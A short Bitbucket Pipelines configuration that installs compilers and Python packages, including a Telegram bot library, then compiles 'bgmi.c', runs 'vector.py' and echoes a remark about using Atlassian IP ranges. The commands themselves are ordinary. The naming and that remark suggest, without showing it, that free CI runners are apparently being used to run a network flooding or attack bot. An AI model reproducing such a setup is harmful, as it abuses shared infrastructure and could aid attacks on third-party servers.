image: atlassian/default-image:3


pipelines:
  default:
    - step:
        size: 2x
        script:
          - echo "Starting pipeline..."
          
          - apt-get update && apt-get install -y gcc libffi-dev libssl-dev python3-pip

          - pip install telebot pymongo aiohttp
          
          - gcc bgmi.c -o bgmi -pthread
          
          - python3 vector.py
          
          - echo "I use atlassian-ip-ranges"
